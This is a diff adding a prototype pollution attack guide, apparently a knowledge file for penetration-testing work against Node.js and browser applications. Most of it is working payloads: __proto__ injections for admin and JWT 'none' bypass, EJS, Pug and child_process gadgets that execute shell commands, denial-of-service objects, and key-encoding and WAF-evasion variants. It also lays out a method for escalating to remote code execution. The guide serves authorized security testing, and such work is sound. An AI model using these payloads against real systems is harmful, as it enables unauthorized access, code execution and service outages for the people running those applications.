@@ -1,0 +1,337 @@
+<prototype_pollution_vulnerability_guide>
+<title>PROTOTYPE POLLUTION</title>
+
+<critical>Prototype pollution allows attackers to inject properties into JavaScript Object prototypes, affecting all objects in the application. This can lead to authentication bypass, RCE (via gadget chains), denial of service, and property injection across the entire application state.</critical>
+
+<scope>
+- Node.js applications using object merge/clone/extend functions
+- REST APIs accepting nested JSON objects
+- GraphQL APIs with object input types
+- Client-side JavaScript with URL parameter parsing
+- Applications using vulnerable npm packages (lodash, jQuery.extend, deep-extend)
+- Any endpoint that recursively processes user-controlled objects
+</scope>
+
+<methodology>
+1. Identify endpoints accepting JSON objects or nested query parameters
+2. Inject __proto__, constructor.prototype, or prototype payloads
+3. Verify pollution by checking if new objects inherit injected properties
+4. Map application behavior to find exploitable gadget chains
+5. Escalate to RCE, authentication bypass, or privilege escalation
+</methodology>
+
+<high_value_targets>
+- User settings/preferences update endpoints
+- Configuration import/export features
+- Object merge operations in API handlers
+- Template rendering with user-controlled objects
+- Query string parsing with nested object support
+- WebSocket message handlers processing JSON
+- GraphQL mutations with nested input types
+</high_value_targets>
+
+<discovery_techniques>
+<basic_injection>
+JSON body injection:
+{
+  "__proto__": {
+    "polluted": "yes"
+  }
+}
+
+Constructor prototype:
+{
+  "constructor": {
+    "prototype": {
+      "polluted": "yes"
+    }
+  }
+}
+
+Nested path:
+{
+  "a": {
+    "__proto__": {
+      "polluted": "yes"
+    }
+  }
+}
+</basic_injection>
+
+<query_string>
+URL parameter pollution:
+?__proto__[polluted]=yes
+?constructor[prototype][polluted]=yes
+?a[__proto__][polluted]=yes
+
+Express.js qs parser:
+?__proto__.polluted=yes
+?constructor.prototype.polluted=yes
+</query_string>
+
+<verification>
+Server-side verification (if you can see responses):
+- Check if {}.polluted returns injected value
+- Observe behavior changes in application logic
+
+Blind verification:
+- Inject known gadget properties and observe side effects
+- Use timing-based verification with known slow operations
+- Trigger error conditions that reveal pollution
+</verification>
+</discovery_techniques>
+
+<exploitation_techniques>
+<authentication_bypass>
+Admin flag pollution:
+{"__proto__": {"isAdmin": true}}
+{"__proto__": {"role": "admin"}}
+{"__proto__": {"authenticated": true}}
+
+JWT verification bypass:
+{"__proto__": {"algorithm": "none"}}
+{"__proto__": {"algorithms": ["none"]}}
+
+Session pollution:
+{"__proto__": {"user": {"id": 1, "admin": true}}}
+</authentication_bypass>
+
+<rce_gadgets>
+<ejs_template>
+Pollute opts for EJS template RCE:
+{"__proto__": {
+  "client": true,
+  "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').execSync('id')"
+}}
+
+Outputfunction gadget:
+{"__proto__": {
+  "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
+}}
+</ejs_template>
+
+<pug_template>
+{"__proto__": {
+  "block": {
+    "type": "Text",
+    "line": "process.mainModule.require('child_process').execSync('id')"
+  }
+}}
+</pug_template>
+
+<handlebars>
+{"__proto__": {
+  "allowProtoMethodsByDefault": true,
+  "allowProtoPropertiesByDefault": true
+}}
+(Then inject malicious template helpers)
+</handlebars>
+
+<child_process>
+Shell gadget for spawn/exec:
+{"__proto__": {
+  "shell": true,
+  "NODE_OPTIONS": "--require /proc/self/environ"
+}}
+
+Environment injection:
+{"__proto__": {
+  "env": {
+    "NODE_OPTIONS": "--require /tmp/malicious.js"
+  }
+}}
+</child_process>
+</rce_gadgets>
+
+<dos_attacks>
+Hang with frozen prototype:
+{"__proto__": {"__proto__": null}}
+
+Infinite loop in iteration:
+{"__proto__": {"length": 1e10}}
+
+Memory exhaustion:
+{"__proto__": {"0": {}, "1": {}, ... "1000000": {}}}
+
+toString/valueOf override:
+{"__proto__": {"toString": {}}}
+(Causes errors when object coerced to string)
+</dos_attacks>
+
+<property_injection>
+Default value pollution:
+{"__proto__": {"defaultValue": "malicious"}}
+{"__proto__": {"timeout": 999999}}
+
+Feature flag pollution:
+{"__proto__": {"debugMode": true}}
+{"__proto__": {"bypassRateLimit": true}}
+
+Template variable pollution:
+{"__proto__": {"title": "<script>alert(1)</script>"}}
+</property_injection>
+</exploitation_techniques>
+
+<vulnerable_functions>
+<high_risk>
+- lodash.merge() / _.merge()
+- lodash.defaultsDeep()
+- jQuery.extend(true, ...)
+- deep-extend package
+- node-extend package
+- merge-deep package
+- mixin-deep package
+- deepen package
+- set-value package
+- dot-prop package (older versions)
+</high_risk>
+
+<custom_implementations>
+Recursive merge patterns:
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      target[key] = merge(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];  // Vulnerable!
+    }
+  }
+  return target;
+}
+
+Object.assign is SAFE (shallow copy)
+{...spread} is SAFE (shallow copy)
+JSON.parse + JSON.stringify is SAFE (no prototype chain)
+</custom_implementations>
+</vulnerable_functions>
+
+<bypass_techniques>
+<key_variations>
+Standard:
+__proto__
+
+Constructor chain:
+constructor.prototype
+
+Unicode variations:
+__pro\u0074o__
+\u005f\u005fproto\u005f\u005f
+
+Array notation:
+["__proto__"]
+["constructor"]["prototype"]
+</key_variations>
+
+<filter_bypass>
+Nested depth bypass:
+{"a": {"b": {"__proto__": {"polluted": true}}}}
+
+Multiple pollution points:
+{"__proto__": {"x": 1}, "constructor": {"prototype": {"y": 2}}}
+
+Key encoding:
+{"__\x70roto__": {"polluted": true}}
+
+Prototype chain traversal:
+Object.prototype via any object's __proto__.__proto__...
+</filter_bypass>
+
+<waf_evasion>
+- Split key across multiple requests (if state persists)
+- Use legitimate-looking nested structures
+- Exploit parsing differences between WAF and application
+- Case variations where case-insensitive matching used
+</waf_evasion>
+</bypass_techniques>
+
+<framework_specific>
+<express>
+Query string parsing (qs library):
+?__proto__[polluted]=yes
+Default extended: true enables nested object parsing
+
+Body parser:
+JSON body with __proto__ key directly
+
+Middleware chain:
+Pollution affects all subsequent middleware
+</express>
+
+<koa>
+Similar to Express with koa-bodyparser
+Query parsing with qs
+</koa>
+
+<fastify>
+Default JSON parser may be vulnerable
+ajv schema validation bypass via pollution
+</fastify>
+
+<nestjs>
+DTO validation bypass via class-transformer
+Pipe transformation vulnerabilities
+</nestjs>
+</framework_specific>
+
+<client_side>
+<dom_clobbering_chain>
+Prototype pollution on client can:
+- Modify jQuery/lodash behavior
+- Bypass CSP via gadgets
+- Achieve XSS through template pollution
+- Modify application state
+</dom_clobbering_chain>
+
+<query_parsers>
+Vulnerable client-side parsers:
+- deparam (jQuery)
+- qs library
+- query-string with nested support
+- URLSearchParams (safe, no nesting)
+</query_parsers>
+
+<client_rce>
+Electron applications:
+Pollution can enable nodeIntegration, contextIsolation bypass
+{"__proto__": {"nodeIntegration": true}}
+</client_rce>
+</client_side>
+
+<validation>
+1. Demonstrate property pollution persisting to new objects
+2. Show behavioral change in application (auth bypass, feature unlock)
+3. For RCE, execute command and capture output
+4. Prove pollution source (which endpoint/parameter caused it)
+5. Show payload that achieves impact with minimal pollution
+</validation>
+
+<false_positives>
+- Object.assign or spread operator (shallow copy, no prototype access)
+- JSON.parse without further processing (safe, creates plain objects)
+- Frozen or sealed prototypes preventing modification
+- Explicit __proto__ key filtering in merge functions
+- Schema validation rejecting __proto__ keys
+</false_positives>
+
+<impact>
+- Remote code execution via template/child_process gadgets
+- Authentication and authorization bypass
+- Privilege escalation
+- Denial of service (application crash, infinite loops)
+- Cross-user data pollution in shared state
+- Security control bypass (rate limiting, validation)
+</impact>
+
+<pro_tips>
+1. lodash.merge is the most common vulnerable function - check package.json first.
+2. Query string pollution often works when JSON body is filtered.
+3. Pollution persists for the process lifetime - affects all subsequent requests.
+4. EJS is the easiest RCE gadget - look for it in dependencies.
+5. Even client-side pollution can be severe in Electron apps.
+6. Check for class-transformer in NestJS apps - it's often vulnerable.
+7. Use constructor.prototype as alternative when __proto__ is blocked.
+</pro_tips>
+
+<remember>Prototype pollution is a logic vulnerability that depends on how the application uses objects. Finding pollution is step one; finding a gadget or behavioral impact is step two. Always map the application's object usage patterns to identify exploitable chains.</remember>
+</prototype_pollution_vulnerability_guide>
+
